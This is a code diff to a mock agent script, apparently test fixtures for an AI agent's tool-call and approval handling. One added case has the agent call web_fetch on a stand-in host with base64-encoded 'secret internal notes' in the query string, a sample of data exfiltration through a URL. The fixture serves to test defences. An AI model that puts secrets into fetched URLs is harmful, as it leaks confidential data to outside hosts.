@@ -351,6 +351,29 @@ export function inferScript(
       },
     ];
   }
+  // The URL is the agent's own choice here, not the owner's words, so site trust does not apply.
+  const fetchCard = lower.includes("fetch ordinary card")
+    ? "https://docs.example.test/guide/getting-started"
+    : lower.includes("fetch suspicious card")
+      ? "https://docs.example.test/c?d=c3VwZXIgc2VjcmV0IGludGVybmFsIG5vdGVzIGZvciB0aGUgYm9hcmQ"
+      : undefined;
+  if (fetchCard) {
+    return [
+      {
+        assistant: "i will read that page.",
+        toolCalls: [{ name: "web_fetch", args: { url: fetchCard } }],
+      },
+    ];
+  }
+  if (lower.includes("history search card")) {
+    return [
+      {
+        assistant: "i will look through this chat.",
+        toolCalls: [{ name: "search_history", args: { query: "history" } }],
+        complete: true,
+      },
+    ];
+  }
   if (lower.includes("fetch approval card")) {
     return [
       {
